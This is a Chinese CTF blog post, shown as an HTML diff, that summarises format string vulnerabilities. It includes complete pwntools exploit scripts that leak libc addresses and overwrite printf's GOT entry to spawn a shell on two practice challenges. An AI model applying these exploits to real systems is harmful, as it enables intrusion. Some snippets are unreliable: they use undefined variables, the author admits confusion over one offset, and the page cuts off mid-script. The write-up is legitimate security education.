@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="格式化字符串漏洞（Format String Vulnerability）是一种常见的软件安全漏洞，它通常出现在处理用户输入的字符串格式化操作中。这种漏洞允许攻击者控制程序的输出格式，进而可能泄露内存信息、执行任意代码或导致程序崩溃。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞学习总结">
+<meta property="og:url" content="http://example.com/post/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="格式化字符串漏洞（Format String Vulnerability）是一种常见的软件安全漏洞，它通常出现在处理用户输入的字符串格式化操作中。这种漏洞允许攻击者控制程序的输出格式，进而可能泄露内存信息、执行任意代码或导致程序崩溃。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931380.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931608.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931998.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931794.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931312.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932215.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932093.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932681.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932757.png">
+<meta property="article:published_time" content="2024-01-29T11:28:26.000Z">
+<meta property="article:modified_time" content="2025-10-16T12:38:56.122Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png">
+
+<link rel="canonical" href="http://example.com/post/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>格式化字符串漏洞学习总结 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串漏洞学习总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-29 19:28:26" itemprop="dateCreated datePublished" datetime="2024-01-29T19:28:26+08:00">2024-01-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 20:38:56" itemprop="dateModified" datetime="2025-10-16T20:38:56+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%A0%88/" itemprop="url" rel="index"><span itemprop="name">栈</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>格式化字符串漏洞（Format String Vulnerability）是一种常见的软件安全漏洞，它通常出现在处理用户输入的字符串格式化操作中。这种漏洞允许攻击者控制程序的输出格式，进而可能泄露内存信息、执行任意代码或导致程序崩溃。</p>
+<span id="more"></span>
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="printf中的格式控制符"><a href="#printf中的格式控制符" class="headerlink" title="printf中的格式控制符"></a><code>printf</code>中的格式控制符</h2><p>​	格式控制符告诉函数如何解析和处理传递给它们的参数。如果<code>printf</code>中的格式控制符没有对应的参数，那么将会泄漏内存中的数据。一个<code>%</code>可以解析一个参数，也就是对应一个参数。</p>
+<ul>
+<li><p><code>%c</code>：以字符形式输出</p>
+</li>
+<li><p><code>%d</code>：以十进制整数形式输出</p>
+</li>
+<li><p><code>%x</code>：以十六进制形式输出，<code>%7$x</code>表示输出参数列表中的第七个参数</p>
+</li>
+<li><p><code>%p</code>：以十六进制形式输出，并加上前缀<code>0x</code></p>
+</li>
+<li><p><code>%n</code>：将<code>%n</code>之前<code>printf</code>已经打印的字符个数赋值给偏移处指针所指向的地址位置。</p>
+<ul>
+<li><code>%n</code>：写入的地址空间为<code>4</code>个字节</li>
+<li><code>%hn</code>：写入的地址空间为<code>2</code>个字节</li>
+<li><code>%hhn</code>：写入的地址空间为<code>1</code>个字节</li>
+<li><code>%lln</code>：写入的地址空间为<code>8</code>个字节</li>
+</ul>
+</li>
+</ul>
+<h2 id="pwntools中的fmtstr-paylod"><a href="#pwntools中的fmtstr-paylod" class="headerlink" title="pwntools中的fmtstr_paylod"></a><code>pwntools</code>中的<code>fmtstr_paylod</code></h2><p>​	<code>fmtstr_payload</code>是<code>pwntools</code>中的一个函数，其函数原型如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,writes,numbwritten,write_size)</span><br><span class="line"><span class="comment">#offset是格式化字符串漏洞的偏移量</span></span><br><span class="line"><span class="comment">#writes是一个字典，用于指定要写入的值和地址，结构如下</span></span><br><span class="line">write=&#123;</span><br><span class="line">    addr_1:value_1,</span><br><span class="line">	addr_2:value_2,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#numbwritten参数表示前面已经写入的字节数</span></span><br><span class="line"><span class="comment">#write_size参数表示写入的字节大小，默认为&#x27;byte&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="非栈上的格式化字符串漏洞"><a href="#非栈上的格式化字符串漏洞" class="headerlink" title="非栈上的格式化字符串漏洞"></a>非栈上的格式化字符串漏洞</h2><p>​	我们通常所说的在栈上的格式化字符串漏洞的意思就是我们可以直接把数据写到栈上，然后对栈上的数据进行一系列的攻击。如<code>A</code>是栈上的一个地址，<code>B</code>是我们要写到<code>A</code>里的<code>printf</code>的<code>got</code>表值，那么现在就是<code>A -&gt; B -&gt; C</code>，<code>C</code>是<code>printf</code>函数的<code>plt</code>表值。然后我们可以修改<code>B</code>这个地址中的内容即<code>C</code>，改成后门函数的地址。而非栈上的格式化字符串漏洞就是我们不能直接把<code>B</code>写到栈上，但是依然可以泄漏和修改栈中的地址等数据。如果我们不能直接把<code>B</code>写到栈上，我们可以先在栈上找到<code>D -&gt; E -&gt; F</code>把<code>F</code>修改成<code>B</code>就变成了<code>D -&gt; E -&gt; B</code>，但是我们最后的目的是修改<code>B</code>指向的地址，所以说这里的<code>E</code>必须是与<code>A</code>和<code>D</code>一样的栈地址，那么<code>E -&gt; F</code>就变成了<code>E -&gt; B -&gt; C</code>，又回到了栈上。</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><code>jarvisoj_fm</code></h2><p>​	先看主函数，直接给我们<code>system(&quot;/bin/sh&quot;)</code>，当<code>x == 4</code>的时候才能执行这个函数。我们看到第<code>10</code>行有个<code>printf(buf)</code>再结合第<code>9</code>行，不难知道这是一个格式化字符串漏洞。那我们就可以利用这个漏洞把<code>x</code>写成<code>4</code>，就可以拿到<code>shell</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181930905.png" alt="image-20240131182232759"></p>
+<p>​	先计算偏移量，偏移量为<code>11</code>，然后构造<code>payload</code>。我们要写入的内容是<code>4</code>，巧的是我们要写入的地址也是<code>4</code>个字节，所以我们直接发送地址就可以写了，<code>payload = p32(value_addr)+b&#39;%11$n&#39;</code>。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">value_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(value_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931380.png" alt="image-20240129124847881"></p>
+<p>​	我们看到<code>read</code>函数，可以读入<code>0x100(256)</code>个字节，而<code>s</code>的长度为<code>257</code>，因此没有办法溢出。继续往下看，<code>printf(format)</code>这一行明显存在格式化字符串漏洞，程序中也没有<code>system</code>函数和<code>/bin/sh</code>字符串。那大概思路就是利用格式化字符串漏洞泄漏<code>printf</code>的地址（本来我想修改<code>read</code>的<code>got</code>表值的，但是后来才相等修改后就相当于程序中没有<code>read</code>函数了，这样肯定是不行的），算出<code>libc</code>基地址以及<code>system</code>函数地址。</p>
+<p>​	怎么泄漏<code>printf</code>的地址呢？本题中我们通过<code>read</code>函数将输入的内容写到<code>s</code>中，而<code>s</code>又是<code>printf</code>函数的参数，因此我们可以利用格式化字符串漏洞去泄漏栈上的内容，因此可以先把<code>printf</code>在<code>got</code>表中值写到栈上，再去泄漏程序运行起来后<code>printf</code>在<code>got</code>表中的地址即<code>printf</code>的真实地址。这就需要计算我们写入的内容在栈上的位置的偏移量，输入<code>aaaa %p %p %p %p %p %p %p %p %p %p %p</code>得到输出的内容数一下偏移量为<code>8</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931580.png" alt="image-20240129132814049"></p>
+<p>​	不过我们也发现了<code>0x20616161</code>中只有<code>3</code>个<code>a</code>，是因为<code>format</code>中还有<code>Repeater:</code>这些字符的原因，所以我们尝试着再输入<code>Aaaaa %p %p %p %p %p %p %p %p</code>，发现<code>0x61616161</code>刚好就是<code>aaaa</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931608.png" alt="image-20240129140029043"></p>
+<p>​	得到偏移量后可以开始构造第一个<code>payload</code>泄漏<code>printf</code>地址了，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br></pre></td></tr></table></figure>
+
+<p>​	得到<code>printf</code>真实地址后，可以计算<code>libc</code>基地址以及<code>system</code>函数的地址，并把<code>printf</code>的<code>got</code>表值改成<code>system</code>函数的地址，这样再次传入参数 <code>&#39;/bin/sh&#39;</code> 再执行<code>printf</code>时，由于将<code>got</code>表给修改了，就相当于执行了<code>system</code> 函数 即：执行<code>system(&#39;/bin/sh&#39;)</code>。这也解释了为什么刚开始我改<code>puts</code>函数的<code>got</code>表不行，因为就算把<code>puts</code>的<code>got</code>表的值改成<code>system</code>函数的<code>got</code>表值，我们后面也不会再执行<code>puts</code>函数，也就执行不了<code>system</code>函数。</p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>​	题目如果是<code>32</code>位的程序，可以用<code>pwntools</code>中的<code>fmtstr_payload</code>函数直接修改地址，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;printf_got:sys_addr&#125;,numbwritten=<span class="number">0xa</span>,write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931998.png" alt="image-20240129144017329"></p>
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>一个字节一个字节的修改，这个方法对<code>32</code>位和<code>64</code>位的都适用。</p>
+<p>​	先把两个地址打印出来，发现四个字节中只有最高字节<code>f7</code>是一样的，我们们需要修改后<code>3</code>个字节，也就是需要这样修改<code>e3 --&gt; e2</code>，<code>10 --&gt; 29</code>，<code>20 --&gt; 40</code>（当然地址是不确定的，肯定不能直接改数字）。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931794.png" alt="image-20240130161627843"></p>
+<p>​	虽然每次地址都会变化，但是我们可以把每次的地址表示出来。<code>sys_addr&amp;0xff</code>将<code>sys_addr</code>与<code>0xff</code>进行按位与运算，得到的结果把<code>sys_addr</code>的低<code>8</code>位（<code>8</code>位<code>1</code>个字节）保留下来了，高位被全部置零。<code>sys_addr&amp;0xff00</code>将<code>sys_addr</code>二进制形式的第<code>9</code>到<code>16</code>位保存下来了，其他位全部置零举个例子就是<code>11111111 11111111 11111111</code>变成了<code>00000000 11111111 00000000</code>。<code>&gt;&gt;8</code>是再将结果右移<code>8</code>位即<code>00000000 11111111 00000000</code>变成了<code>00000000 11111111</code>。<code>(sys_addr&amp;0xff00)&gt;&gt;8</code>就是把<code>sys_addr</code>的倒数第二个字节保留下来了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931920.png" alt="image-20240130175341704" style="zoom:67%;" />
+
+<p>​	然后下面这一步中<code>sys_addr1-(9+13)</code>减的是<code>printf</code>中前面参数字节的总和，程序中的<code>Repeater:</code>是<code>9</code>个字节，<code>payload2 = b&#39;a&#39;+p32(strlen_got)+p32(strlen_got+1)+p32(strlen_dot+2)</code>一共<code>13</code>个字节。（其实为什么要这样我也不知道）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br><span class="line">result = system_addr_4-system_addr_3</span><br><span class="line">system_addr_4_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​	最后构造<code>payload2</code>，<code>bytes(str(sys_addr1_value),encoding=&#39;utf-8&#39;)</code>的意思是把<code>sys_addr1-value</code>转换为字节串<code>bytes</code>类型。<code>%hhn</code>是修改低<code>1</code>个字节，<code>printf_got+1</code>会把<code>printf_got</code>的倒数第二个字节变成倒数第一个，然后就可以修改低<code>2</code>个字节了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span 